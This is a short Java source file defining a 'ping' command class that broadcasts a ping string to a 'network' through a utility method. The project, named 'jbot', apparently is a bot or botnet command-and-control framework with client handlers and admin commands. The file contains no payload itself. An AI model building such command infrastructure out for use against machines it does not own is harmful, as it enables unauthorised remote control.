package me.aaronakhtar.jbot.command_manager.commands;

import me.aaronakhtar.jbot.Utilities;
import me.aaronakhtar.jbot.command_manager.JBotCommand;
import me.aaronakhtar.jbot.threads.handlers.ClientHandler;

import java.io.BufferedReader;
import java.io.BufferedWriter;

public class PongCommand implements JBotCommand {

    @Override
    public String getCommand() {
        return "ping";
    }

    @Override
    public String getDescription() {
        return "send a ping, for absolutely no reason to the network.";
    }

    @Override
    public boolean isAdminCommand() {
        return false;
    }

    @Override
    public void doAction(String[] args, ClientHandler client, BufferedWriter out, BufferedReader in) throws Exception {
        Utilities.executeCommandToNetwork("ping");
    }
}
